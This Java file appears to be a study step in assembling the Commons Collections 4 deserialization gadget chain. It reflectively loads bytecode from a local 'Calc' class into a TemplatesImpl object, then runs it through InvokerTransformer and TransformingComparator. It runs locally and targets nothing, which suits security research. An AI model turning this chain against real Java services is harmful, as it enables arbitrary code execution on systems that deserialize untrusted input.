import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class PreChain {
    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException {
        TransformerFactoryImpl factory = new TransformerFactoryImpl();

        TemplatesImpl templates = new TemplatesImpl();

        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "Calc");

        Field tfactory = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, factory);

        byte[] bytes = Files.readAllBytes(Paths.get("./util/target/classes/org/ixpqxi/util/Calc.class"));
        byte[][] bytecodes = {bytes};

        Field _bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        _bytecodes.set(templates, bytecodes);

//        templates.newTransformer();

        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});

//        invokerTransformer.transform(templates);

        TransformingComparator<Object, Object> transformingComparator = new TransformingComparator<>(invokerTransformer);
        transformingComparator.compare(templates, templates);
    }
}
